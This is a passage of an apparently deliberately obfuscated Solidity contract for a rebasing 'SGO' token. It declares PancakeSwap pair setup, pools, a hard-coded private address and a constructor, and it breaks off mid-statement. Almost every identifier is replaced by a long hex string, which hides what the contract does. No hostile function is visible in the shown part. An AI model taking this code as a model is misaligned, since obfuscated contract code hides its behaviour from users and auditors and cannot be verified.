constant Oxbb00061cf787524ec5a2cea9b1d26d1b32aab6e64448a3c5f398298c446e024eeb1c77e98a1d1171641a115a31615521f535248da7017Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f24629a98b4ecc33c2 = 40000000;uint256 public constant Ox81dcac92939953863e9c099a28fb8b7f07ce9b4281c262c7d50816ffdb8e65a07764508abd1253fd9010bceb1b0104e3a6a65716bfb607a90291889f39b55ea9 = 18;uint256 public constant Oxe7cd4f0241f5873c9cd515c34a1b86f54944721b562b167871985300228cae7d3acd00a8fd576c0905b50af2104d964fd70cec5f78b8aa247e6c4743e0661d5f = ~uint256(0);uint256 private constant Oxa3f4b1911c4c371e615e30f83588822540db40dd4046fc49fc7c6bde2cfa167817958320554d6a3ae5ad5153a101c0509358b1f198bc445657e38557f02c3954 = 10**7;uint256 private constant Ox23a23302a8ce8d5137fd57de597e5dc06f18eeac97dfd3ebdf861c15f0a0841b4af31c78f2f73b1578098aa16548ed80230e3832171439f6a5db76f8f3939704 =50 * 10**3 * 10**Ox81dcac92939953863e9c099a28fb8b7f07ce9b4281c262c7d50816ffdb8e65a07764508abd1253fd9010bceb1b0104e3a6a65716bfb607a90291889f39b55ea9;uint256 public Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 = 9;uint256 public Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726 = 5;uint256 public Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761 = 1;uint256 public Ox07fe5fa7813b29f37efc95b0ac50a921d508788507c00a0eeeeb94ac448977ee3bd892d5b4dea250b88c062aa56b75254954a6f4feb5020afc9ef8196d3f614f = Oxeffba7a93be5129486f98d9d69b729fa035fc588027668e435faebcb005a7bf6e274dfa9eb65df6cb9fe5753a5151999b77f274b1e697a40c3ce044786db42f4 + Ox9f976ec4e0c100d174cb4a9d068dfb544bb836bc6613bea436fef95ea5db90d64f777517c5f6b72284d884fcf85692c32f440c8072497b07a3f82a74edfa3726 +  Ox0b0537536ea8281f328e2050ebe84906ea0ff4ad574aa06212b6a3b50de61175bc740112042e2220374384ff7424b2ed3cb9ba8ad3626817e2659b202464e761;uint256 public Ox3156d7b67ba72b05b15d356122954b4279e68519fd1b098bf2500f9217ba094a26b38fbb355f14f2ad6387ac9731873d16c2221b92a5a7c0b9603f74e68f57c7 = 1000;address Ox56ea3c85383a69c4ff3f1157792fe864e068a75c1ab993a78ec50f0cca5b44211ffb0c1b308b0ed5e3b2b9d85a30830910528dd2d9d8f6e0ca660a011fa52aef = 0x000000000000000000000000000000000000dEaD;address Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91 = 0x0000000000000000000000000000000000000000;address public Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0;address public pairAddress;IPancakeSwapRouter public Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f;address public pair;bool Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 = false;modifier Ox1cc656cb50ff6dc39de26a95a2b4fb1941a69b3c6f48320e3b4d4791ca8630bb0f90f1f76245d3b1b012a4af7d61435fac68d22174bcb921319a32b7653e1fb6() {Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 = true;_;Oxaa951d07763d133f78d33a29da4a80a94fe882a8aa523fddbbcbfab95f38a7319d476af8d939bedcbb54dc37869f3c6071e6d64a9e194cf3cac48856c3d013e3 = false;}uint256 private Oxc84789b154ce6a4b7bbe865a6d15251f1aa3590248384c055d188f4ac13f6f1eaac0fae5710443d292de9071175ad45e82828bb47cb992094bf730c2e5092bcb =Oxe7cd4f0241f5873c9cd515c34a1b86f54944721b562b167871985300228cae7d3acd00a8fd576c0905b50af2104d964fd70cec5f78b8aa247e6c4743e0661d5f - (Oxe7cd4f0241f5873c9cd515c34a1b86f54944721b562b167871985300228cae7d3acd00a8fd576c0905b50af2104d964fd70cec5f78b8aa247e6c4743e0661d5f % Ox23a23302a8ce8d5137fd57de597e5dc06f18eeac97dfd3ebdf861c15f0a0841b4af31c78f2f73b1578098aa16548ed80230e3832171439f6a5db76f8f3939704);uint256 private constant Oxcb75eb9442bc33146be25c9b1a0841155a1bfd1124954b177623ed5658a39e25a8153569d6a6226a1f38b960e046655506c0714f3b37dc2c6c59bac100381935 = 50 * 10**7 * 10**Ox81dcac92939953863e9c099a28fb8b7f07ce9b4281c262c7d50816ffdb8e65a07764508abd1253fd9010bceb1b0104e3a6a65716bfb607a90291889f39b55ea9;uint256 private constant Oxf4ea9deeb13f0a8ae2f17f00f74a388ba979d375194956b1ea8dd50937e83008acbbf0537082d5aa9b0cbfe193a4fd03dd0546e3540b8e4839b3a4e2c3e93942 = 50 * 10**2 * 10**Ox81dcac92939953863e9c099a28fb8b7f07ce9b4281c262c7d50816ffdb8e65a07764508abd1253fd9010bceb1b0104e3a6a65716bfb607a90291889f39b55ea9;bool public Ox35d0e5f6d18ca25a20d28eaf977b9f372a611a7357e93fa6d7da9ef688751187a1be9f4a02b575e051d6c5488aa76de8df8c9e6286926c1d646da8d7161ae1a8;uint256 public Ox975a090b0c5b2fe79f93da624ad73e35cbf907ca52432db018325198c32f20254620cae25839cb278e7b006a112a952d985b21f616493f3c1d71d222f217b040;uint256 public Ox7663b6cb935b6748fe900e5ebe2ab0d1836f472a08f715ae5dcc83eace0b9ca8555abe274bbeda18491a88f145a658ba4c8ca72b0dd51d9691357b000f6d11b6;uint256 public Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd;uint256 private Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;bool public Oxdd65c71add8d31110845960c8917e55d8ffc5be16dda083b127618148ed0dafd846e59da613c4e11969927aa8086d053fd527c8d8767720c521caab402e6c76f;struct Oxc329cbf6048eccd2f64aa5e6f83828d2ec9622f13f7ff7e307dde52bbcaa44d94034e82e836e9a0af50f6f80b1f5a452d4e841baf2e7b5d6bba06e9200f99306 {address Ox1780d1286efebe51a3c34522752a25b78b13275710cb9c46ba21df5d5e0db49ab8f68cbc1d4eb43fdb980125aaa7b760c959b15c3840b886e4eb8b7e044dea67;address Ox3671e6aea93127de915be614b9e78f64ecd7b471d5bc246b621706ce12468d46adbb814ef833b850cf7a74aa84f9b31e25be6e5cd4eff8dd2eab47b567a834d7;address[] Ox5f57b9f1b16673b2c907d02b529bf0bc823bcf6bf911e1a44d2954e238ffe25ecccf4c29d097d46526b12e66bb0a30596755bde67972f2ae139bca3584297ce2;uint256[] Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b;uint256 Oxa82526388298eb946c1519386d2ea42e558cca8d35df99a615ad184e5eac4600fb4c4f60d4d88fda427eb3d0bdd16fd11a331bb01151fa75b9f2ed34844cf640;bool Oxe0260b87897456a7a34c013d22ae44ddb5e06bd3b23a4142b6d841d169bc38c62731fb0ff5f137302e53c89df68ec799079c155073c390524508d5b10577c247;uint256 Ox193bc2e3d520d000f97cb7aa3756c9bd6ad69586f091a692108f7a3bbda8eec6905c32747a3f026e79f08fb3fb8f4448f0502a2cd88543aadcc1b533b25a257d;uint8 Oxba4d4f1cc732b8d3c8fdbcb5e7287a442ac31a97c823059fd4342396812412abc669e9953cfdd5ef58b27c3dd0602d10e64b8d097253c47091de07bfba934bc7;uint256 Ox01fe15591c78b04342f4da119495ef4e6f14c11acc8fae7c4a96b943b9ec458794dc99b651dcee67c1f3cb3b3f6bcea44d67f1a25c6ab5ad07080b07779b6a2a;uint256 Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a;uint256 Ox562e39742b68b36af3d251b2be5a0466520ce20cd90b77edd2e1c61ae4fd09942bc5e9666aab4b50c1ab293ad7a07a125e99c7dd851e4685ebd47430a6971d27;bool Ox76999dd0fdcfa0d3916eefa176455e9430af5de4294d57f9df5f55ec9ceed41ee200b3288bcf9fa1fe8ae10f3e45d29b53877c52eefd47e495fe8bc564c003dd;address Ox56873814d5d92886d4306272973abf3a7aa09858124ab4281894b289960e10fbd734bee3c0458483de744e4d676d8affdce4075d7be7d9e924fe84a9253aaa67;uint256 Oxb733761bdc55c4ad606df7f1ea85673983cb74d3671abbc2f8eda90fadd99a52035867acee76eb2480297f61cddeeae4be01284fc41588e5203c12400b6a8407;}struct pool {uint256 Ox8408bfd8615b20256b2209b1e0a32f520187c0db537e303def568990210918b49e7c5a550b78ee45b687f66fa53847a472025fe25a4df28ba739df8e046bfcfd;uint256 Ox9e7d7956eab2d1f3d718fd7ba21002f364ed5bd77593e1ab1fa39c156d95796518b9b8ec73ad5864a6ae1c68081008b780294c8421db4db4a3de9c4f5ebebe0d;uint256 Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0;uint256 Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86;uint256 Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181;uint256 Oxf53b536f8f63a121f71a8464f904c96d4e525bae023cd62463aa5813869ef7d6475fc7f26e87b92590343771cb728d766190079a63f7985a111c0b22dd355e42;uint256 Ox6dc3e5a144bc89b0b58760037b33158ae2580f55c9b340eb5160e17b3f97f7acd6378ef1c1050cfa7d6f665927b4e3477f9a250e9e8f2b9574d1127c95436cbe;IPancakeSwapPair Ox25ac60a6ced7dd9cad804b6813939b022bd79181f9455c8ccb620725ed5528fc348781bb27c44ff3f41a236e7b969370830861c8d5926de958deded430edec84;uint256 Oxf149a105051114819da29531bb0902c5e1f84466db4ab02f408e33d2c027b1fc8c7b6c75a8391e932e838ad0287bc1e43e576054bff2074f7effa10f7a036df2;uint256 Ox3bca59f7beea7a50df18ecb068f7355bdb46b29de2ec324c907ac132570588955fba70c9bab890a3e5d48e936762b1449cc14a9fdab9938cd2a2a47ff6316ef5;address Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f;address Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c;uint256 Ox5fa83ae41e2b6af4338e3d0f12161506a97bc98f73eef539c419e0e14b885457bbdb54da26392cf4c7e002892f032c1a15f850054e233563c54bfeacd83ab21a;uint256 Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774;address pairAddress;IPancakeSwapPair Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827;}uint256 private Ox0403023a5a16c7a0d7904d6ee0366ad38a78594bce84104d00d882997f339be0104423324fab9f50932c2e65e2c79df6e80a948b90a3767e7d5bb16808739b0a = 7;Oxc329cbf6048eccd2f64aa5e6f83828d2ec9622f13f7ff7e307dde52bbcaa44d94034e82e836e9a0af50f6f80b1f5a452d4e841baf2e7b5d6bba06e9200f99306 public Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd;uint8 public Ox7610dd5f5c2963d7a893adb3ff9c27b53ef3a3850e1c931539ebf6dc75efabba7db157ceb7392f98a9ac49aff4414f4f168f6a2c9daf6b4437768890c395c650;uint8 private Ox3c0e9e573404ec8384357ba72551e7710666ba08e4b25ca7764778b471ebb47998ea545e5242d660ddc058691fc4b6505086d8215fce8ae66bdf07f1c29e42f9 = 2;uint256 public Ox2137144dec0b7fed8619322f3295bd33873f72098513dcfbb6b0d8cd6b8f13fedde9f323ea33008281b572a8dc77436018412423fe579b086c5a7d83ea7d072a;uint256 public Ox48be9fd108263d040861f3db3a6c49952c64d1401493503537bfd07916b86e89f26bd76b67c76ceebc5d0775c3c97807cba53f8b740ed1a64c083e929c53313d;uint256 public Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e;bool private Ox7165f36f5376e104d09295ed5ec2c5debc07e6795dd8de7f8d5a89876c58c4696e7bac6b6e4eaa8cc0707fa0ee2a84f1270c6be1b5177b6b1ff6b9df992db620;bool private Ox114290340134a2bfa301152b6a7c4fb48d2e3ffea80d6e14fe42b85976f362bea9848775601951796655fd46b9269174ed48010e86f6ad8d33c9a21dc5b78162;uint256 private Ox28e152919405b6345efac476f87cfd51ac565da9219253ebc49d030e0de2b2fd1d26198d24637abe6f82f2c29e8397c4e9d9ab8ee55736d980a440e18061ad79;bool public Oxe2d41e1b80051323b970e338db05256bc38630ad3195caa4cefe435979e58a56416bcd4cdfabf720d065e0aadfe6a2f6690dc340e451eca63af2a25840cff94d;bool private Ox95b66eb5787f49baf7f65d3614d8eef6296335b3dff7e28a3981f70494cb5f1c52f298c61b4f33f01bf1592daaaf79345d930391307963633a3f36e29e8c401a;address[] Oxfaa0612792175a4dd929131e0b5b760da44171429b9e76d5d7001cf1af4173792e941f3ce02e88d42e4f8c37c27c81fa0a94bcfb55276f8765d5dbbdc568b307;uint256 private Oxbcab3301be21a77b5a1b795fcc21dd615d8d8de6dcbf57d424930c589e6b69ecfebf2e121abd59964ae3589af43b3dad3965a63a9ae7d21c3f9946a83d0f6591;address private Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;uint256 private Ox4271961e9eedf5678bac682977725e2299d8e833199505b8c97e295e272938da511cd9748d21164a8dae795c21f69c0ec0a5e75c180f741e11f2cd52341933c3;uint256 private Ox2bb0f640b8e2d5bd0b1cac1bae18d8b6c2a2d7739caf071dc07ebf529eb493ca1658495b091b7b09ab6f3abad3a2827f4b3fa9f6b5c2d3a584b6be4cea5282f7 = 1;uint256 private Ox0092ac9010d14087f3aa54274c3a14387fd8e04d566eef44f6285317efc3efcbacc3acdb79423aa29bcf6f5ad2c3d14441f761e81904c8134dbf7bbb8f496707 = 1000;uint256 private Oxc21750d6477b3985f16b1c25c985685fa543c89d78f4408c923fb1137b1b79e5c806d3cccad81ca302e9f01b5e1c9d19331a792718a437ce8257807130fa6fbb;mapping(address => pool) private Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b;mapping(uint => address) public poolList;mapping(uint => uint256) public Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b;mapping(address => uint256) private Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c;mapping(uint256 => uint256) public Oxdf8e550541dad141f0832ce8fc0b522276aa867636a02d977198bba16e73ac28bb1cc118a2acaccd034cd8dc76531be10d9966f4dd34a0a22262286c0678342c;mapping(address => uint256) private Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57;mapping(address => mapping(address => uint256)) private Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159;mapping(address => bool) public Oxc6cb327aeadb2e38990524e0ca5bd04fb891b57b87b993040a6461ef94b3a38092080b6ef8a8b8bc54c106891bf971f8c7347b5ed9240f876214b0096d8af130;mapping(address => uint256) private Ox2c8c0c56e8f34182bf27eb23aa6b29191c4b95233d35e2bc856e158a60c460355b6c48588b0615ad2ce7f82c921b7e771e7183bd0eff3cbffe3358382a862f35;event LogRebase(uint256 indexed Oxd86f784986e3688063d35223689c447989b215fada9812213def6784267152ca9b595f4ea32c5c48b2658e31812484e5c8b7f48fd8b017c180857fa6b6783609, uint256 totalSupply, uint256 Oxd56d26c9b68fdb3d310003c61a73ce7b6b91a8b13640baa7c3bea580193b219d321f2871a6a6e7e81c2c6fc29c016188faf7e4c306f6d60d75ec9afd2b5f0151, uint256 Oxb3dc54425dc2f44facc95751366db252301abc22539fd5b447db9535a72f1bd9727c674adb6e765e3741056ba41719f93df41d4a5cf068ea5a4123c9825123c0);event Ox6aea95d6b592dfb6a6778e7270ed1ad2dd691e514ec81c2208bf050f07ba07a02982f60a0b198cf90b115b38168293e33be185cbef554e8de6712060dd021a25(string message);event Oxbbda8b35ceeee74fdce0e9c40a9d0d134e3c2a80746b626b3f5e17a4397413ea70c5281e6bd551348df1363c0014cdcbd59045db89ee1738bef7cd1e3d936f91(uint256 amount, uint8 podId, address recipient);event Oxfcb94671f022535626f1f8fdab1759ec103f18e95c4247acd3385dfccfd5bf5c494565844ebc8c32b6f23c26a69ba4fb8f0fa9819f655e16deb75c90ba91a6c4(uint256 Ox3bd07d31c9f2d7f2b0547ca04574a6e46e13b2fdd7b625592b342c521ce90e02d3c4bc0e945ceff2e4c3e59f718e5cf954f14227959e98d969cd710187880d17, uint256 totalSupply, uint256 Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f, uint256 Oxa1d4a72086d60b334f81730a786f5b06dbfe12fa0321b515e15dcbc46e4556b40bcd1527f9a655dc570dcc571e783d43b8844ae016bfd3d1aff471ce691caaad, uint256 sgoTOx6b41e88162d9a358ab1fdad41ece647c88628e5287f05eae8d5e83099e873fd7e7c0e2c7133b0f7a9db204cb3457ab8d2b7e5d7be8096738aa08df7f1bc71882, uint256 Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a, address Oxf1df217c327f7e6dbb21de2d6c6e59449a134c4af6f621e0fc9b4b15e5a363a85b11af380cbf56df1b8789cf19d39415ee522baffbe886a3a10193f4679d686a, uint256 Oxd9ec526e2016b9574dc74cadcd3539a8c07cfa1a15e36b325209a9578d3287f6b8c28e66895e840be586b9415d4d0e37c87bc1cfdd937f0436819389b5efb879);constructor(address _Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e,Oxc329cbf6048eccd2f64aa5e6f83828d2ec9622f13f7ff7e307dde52bbcaa44d94034e82e836e9a0af50f6f80b1f5a452d4e841baf2e7b5d6bba06e9200f99306 memory Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee, pool[] memory _Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b) ERC20Detailed("SGO", "SGO", uint8(Ox81dcac92939953863e9c099a28fb8b7f07ce9b4281c262c7d50816ffdb8e65a07764508abd1253fd9010bceb1b0104e3a6a65716bfb607a90291889f39b55ea9)) RBAC(msg.sender) {Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e = _Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e;Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f = IPancakeSwapRouter(Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Ox1780d1286efebe51a3c34522752a25b78b13275710cb9c46ba21df5d5e0db49ab8f68cbc1d4eb43fdb980125aaa7b760c959b15c3840b886e4eb8b7e044dea67);pair = IPancakeSwapFactory(Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.factory()).createPair(Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH(),address(this));Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0 = Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Ox3671e6aea93127de915be614b9e78f64ecd7b471d5bc246b621706ce12468d46adbb814ef833b850cf7a74aa84f9b31e25be6e5cd4eff8dd2eab47b567a834d7;Ox3c1af09a5cfa84aa3d6c483c6e91a87fcca97f7c5c878d97641ded72fc52f0c88f31ed9d0743cf412d00a93722f4e963097923a03a3350691db4f337ca801159[address(this)][address(Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f)] = type(uint).max;pairAddress = pair;Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827 = IPancakeSwapPair(pair);Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd = Ox23a23302a8ce8d5137fd57de597e5dc06f18eeac97dfd3ebdf861c15f0a0841b4af31c78f2f73b1578098aa16548ed80230e3832171439f6a5db76f8f3939704;Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0] = Oxc84789b154ce6a4b7bbe865a6d15251f1aa3590248384c055d188f4ac13f6f1eaac0fae5710443d292de9071175ad45e82828bb47cb992094bf730c2e5092bcb;Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606 = Oxc84789b154ce6a4b7bbe865a6d15251f1aa3590248384c055d188f4ac13f6f1eaac0fae5710443d292de9071175ad45e82828bb47cb992094bf730c2e5092bcb / Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd;Ox975a090b0c5b2fe79f93da624ad73e35cbf907ca52432db018325198c32f20254620cae25839cb278e7b006a112a952d985b21f616493f3c1d71d222f217b040 = block.timestamp;Ox7663b6cb935b6748fe900e5ebe2ab0d1836f472a08f715ae5dcc83eace0b9ca8555abe274bbeda18491a88f145a658ba4c8ca72b0dd51d9691357b000f6d11b6 = block.timestamp;Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7[Ox7a8ddc1ce303c70bf6aad0245c528061f55dcb830eb64c6511a1219cddccc3eb072c9f0a7141aa33c946de21d4e3bc018b368065ed6b2261d1ac225f1aa1f7a0] = true;Oxf7980711b86977ba5e8d654647570bbd8c8d15c69b771871955c099a0adc23068683ae241fb17e5fe7fb7dd012faba896de9d52d469d66743a7d90b26aade0e7[address(this)] = true;Oxfaa0612792175a4dd929131e0b5b760da44171429b9e76d5d7001cf1af4173792e941f3ce02e88d42e4f8c37c27c81fa0a94bcfb55276f8765d5dbbdc568b307 = new address[](2);Oxfaa0612792175a4dd929131e0b5b760da44171429b9e76d5d7001cf1af4173792e941f3ce02e88d42e4f8c37c27c81fa0a94bcfb55276f8765d5dbbdc568b307[0] = Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH();Oxfaa0612792175a4dd929131e0b5b760da44171429b9e76d5d7001cf1af4173792e941f3ce02e88d42e4f8c37c27c81fa0a94bcfb55276f8765d5dbbdc568b307[1] = address(this);if(Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b.length>0) {Ox7610dd5f5c2963d7a893adb3ff9c27b53ef3a3850e1c931539ebf6dc75efabba7db157ceb7392f98a9ac49aff4414f4f168f6a2c9daf6b4437768890c395c650 = uint8(Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b.length);for(uint8 i;i < Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b.length; i++) {Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b[i] = Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Oxc156091f257e4f6dbf4eb0761ce9d944de8996f5c8988f32ff849f19402ba44082c240dc5d0b33b839952391a40f94be2928f3c180e9c688521ebc4d900fe86b[i];}}Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd = Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee;Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[Ox3fd49aaf123262c9488283fe59596fd271b6e9da0978e5d9cee0168c078996d9705fb03528f2a49a2136b81bb9008092265fe7fc2d082279296f83f37bec538f.WETH()] = 1e18;Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e = 1;if(Ox59175c048ab881bb50efd158ec689bb270dffc7fccf1f8526ac53c959c8ebae6a5cfc8b38939d5c45c17df108a0807537221efe2419674dfd9c672758b25b8ee.Ox5f57b9f1b16673b2c907d02b529bf0bc823bcf6bf911e1a44d2954e238ffe25ecccf4c29d097d46526b12e66bb0a30596755bde67972f2ae139bca3584297ce2.length>0) {Ox8dc8e82471e29438c0ca37dd5e9c9b127f2d337aef0ae35da32407ea79b6f88a901e4a149243639a8c0ceaedc018e108f28061f926398359915ca428140bf09e += 